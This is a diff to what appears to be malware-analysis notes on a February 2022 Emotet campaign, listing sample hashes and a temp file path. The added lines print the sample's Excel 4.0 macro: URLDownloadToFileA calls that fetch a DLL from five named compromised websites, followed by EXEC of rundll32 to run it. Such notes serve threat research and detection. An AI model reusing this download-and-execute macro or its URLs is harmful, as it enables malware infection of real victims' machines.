@@ -4,6 +4,24 @@ Emotet 2022 - 04.02.2022 - epoch5
 
 .xls 0b0cf2d569a4f037b4a9267415997abd1ec6612cffb7830f2aa6268697e0efc4
 
+	  =CALL(urlmon,URLDownloadToFileA,JJCCBB,0,http://landorestates.com/wordpress/NELf96wr/,..\wlw.ocx,0,0)
+		
+		=IF(KKLD<0, CALL(urlmon,URLDownloadToFileA,JJCCBB,0,https://www.rockwoodsaloon.com/wp-admin/A706GTXNufQSWXG52/,..\wlw.ocx,0,0))
+		
+		=IF(KKLD1<0, CALL(urlmon,URLDownloadToFileA,JJCCBB,0,http://butziger.com/meettiming/hBJCeNGAvBpGZoD7ee/,..\wlw.ocx,0,0))
+		
+		=IF(KKLD2<0, CALL(urlmon,URLDownloadToFileA,JJCCBB,0,https://teamsandeep.com/wp-content/p3f2n6wc4nwfg/,..\wlw.ocx,0,0))
+		
+		=IF(KKLD3<0, CALL(urlmon,URLDownloadToFileA,JJCCBB,0,https://csinoticias.com/wp-includes/RnHjIzg/,..\wlw.ocx,0,0))
+		
+		=IF(KKLD4<0, CLOSE(0),)
+		
+		=EXEC(C:\Windows\SysWow64\rundll32.exe ..\wlw.ocx,KKLD8)
+
+    =RETURN()
+    
+************************************************************************************************************
+
 .dll 1d808f6b84f0c9569b77d4a2934da6a6bb2a395c8d0fc45ecdc948bd14202dd5
 
 EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\report_708.xlsm
